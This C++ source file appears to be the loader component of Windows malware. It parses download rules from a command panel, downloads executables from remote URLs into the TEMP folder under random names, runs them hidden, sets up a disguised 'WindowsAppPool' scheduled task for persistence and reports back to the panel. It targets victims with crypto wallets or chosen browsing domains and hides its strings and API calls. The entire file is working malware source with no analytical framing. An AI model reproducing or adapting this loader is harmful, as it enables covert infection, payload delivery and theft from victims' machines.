#include "Common.h"

bool Loader::GetRules(string response)
{
	string config = response.substr(1).substr(0, response.size() - 2);
	vector<string> loader = Utils::splitBy(config, '|');
	if (!loader.empty())
	{
		for (size_t i = 0; i < loader.size(); ++i)
		{
			const string query = loader[i].substr(1).substr(0, loader[i].size() - 2);
			if (query.empty())
				continue;
			vector<string> temp = Utils::splitBy(query, ';', true);
			if (temp.size() >= 5)
			{
				LoaderRule rule;
				rule.url = Utils::trimStr(temp[0], ' ');
				rule.args = temp[1];
				rule.onlyDomains = Utils::splitBy(Utils::trimStr(temp[2], ' '), ',');
				rule.cryptoOnly = BOOL_STR(temp[3]);
				rule.addAutoStart = BOOL_STR(temp[4]);
				rule.id = Utils::str2ull(temp[5]);

				rule.active = rule.onlyDomains.empty();
				rules.push_back(rule);
			}
		}
	}

	if (!rules.empty())
	{
		return true;
	}

	return false;
}

void Loader::ProcessDomains(const vector<string> & domains)
{
	for (LoaderRule& rule : rules)
	{
		if (!rule.onlyDomains.empty())
		{
			bool found = false;
			for (size_t i = 0; i < rule.onlyDomains.size() && !found; i++)
			{
				if (Utils::contains_record(domains, rule.onlyDomains[i]))
				{
					found = true;
				}
			}

			rule.active = found;
		}
	}
}

void Loader::DownloadFileToMem(string link, string& data)
{
	API(OLE32, CoInitialize)(NULL);
	IStream* pStream = nullptr;
	HRESULT hRes = API(URLMON, URLOpenBlockingStreamA)(0, link.c_str(), &pStream, 0, 0);

	if (SUCCEEDED(hRes))
	{
		while (pStream != nullptr)
		{
			DWORD dwGot = 0;
			char szBuffer[200] = "";

			if (pStream->Read(szBuffer, sizeof(szBuffer) - 1, &dwGot) != S_OK)
				break;

			data += string(szBuffer, dwGot);
		}
	}

	if (pStream != nullptr)
		pStream->Release();
}

void Loader::RunSuccess(string ruleId)
{
	HTTP().POST(panelLink, panelPort, XorStr("/loader/complete/"), Enc::Encrypt(ruleId));
}

void Loader::DownloadExecute(bool cryptoWallet)
{
	for (LoaderRule rule : rules)
	{
		if (!rule.active) continue;
		if (rule.cryptoOnly && !cryptoWallet) continue;

		const string key_file = Utils::GetEnvVar(CRC32_STR("TEMP")) + XorStr("\\") + Utils::random_string(8) + XorStr(".exe");

		string fileData = string();
		DownloadFileToMem(rule.url, fileData);

		HANDLE hFile = API(KERNEL32, CreateFileA)(key_file.c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			DWORD bytesWrited;
			API(KERNEL32, WriteFile)(hFile, fileData.c_str(), fileData.size(), &bytesWrited, NULL);
			API(KERNEL32, CloseHandle)(hFile);
		}
		fileData.clear();

		if (API(SHELL32, ShellExecuteA)(0, NULL, key_file.c_str(), (rule.args.empty() ? NULL : rule.args.c_str()), 0, SW_HIDE) > (HINSTANCE)32)
		{
			if (rule.addAutoStart)
			{
				string schtask = XorStr("/c schtasks /create /F /sc minute /mo 1 /tn \"\\WindowsAppPool\\AppPool\" /tr \"") + key_file + XorStr("\"");
				API(SHELL32, ShellExecuteA)(0, 0, Utils::GetEnvVar(CRC32_STR("ComSpec")).c_str(), schtask.c_str(), 0, SW_HIDE);
			}

			RunSuccess(std::to_string(rule.id));
		}
	}
}